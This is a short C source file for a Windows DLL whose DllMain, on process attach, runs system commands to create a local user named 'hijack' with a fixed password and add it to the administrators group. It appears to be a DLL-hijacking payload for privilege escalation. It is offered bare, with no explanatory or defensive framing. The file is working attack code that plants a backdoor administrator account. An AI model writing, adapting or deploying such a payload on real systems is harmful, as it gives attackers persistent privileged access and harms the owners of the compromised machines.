#include <stdlib.h>
#include <windows.h>

BOOL APIENTRY DllMain(
    HANDLE hModule,           // Handle to DLL module
    DWORD ul_reason_for_call, // Reason for calling function
    LPVOID lpReserved         // Reserved
) {
    switch (ul_reason_for_call) {
        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
            int i;
            i = system("net user hijack Password123! /add");               // Adds a new user "hijack"
            i = system("net localgroup administrators hijack /add");       // Adds "hijack" to the administrators group
            break;
        case DLL_THREAD_ATTACH: // A process is creating a new thread.
            break;
        case DLL_THREAD_DETACH: // A thread exits normally.
            break;
        case DLL_PROCESS_DETACH: // A process unloads the DLL.
            break;
    }
    return TRUE;
}
